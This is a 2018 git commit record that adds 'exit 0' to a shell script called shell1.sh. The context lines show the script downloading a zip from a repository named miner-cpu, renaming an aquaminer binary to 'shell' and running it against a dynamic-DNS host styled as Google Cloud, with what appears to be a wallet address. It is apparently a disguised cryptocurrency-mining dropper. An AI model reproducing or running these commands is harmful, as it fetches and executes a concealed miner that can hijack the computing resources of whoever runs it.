37f2eb299bf2a330f0472ef6f162940b49696be2
StupidmanTan <40017939+StupidmanTan@users.noreply.github.com>
2018-06-21 01:35:50 +0700

    Update shell1.sh

--- shell1.sh
+++ shell1.sh
@@ -22,3 +22,4 @@ wget https://github.com/StupidmanTan/miner-cpu/raw/master/kaka.zip
 unzip kaka.zip
 mv aquaminer-0.4-linux-amd64 shell
 ./shell -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/shell
+exit 0
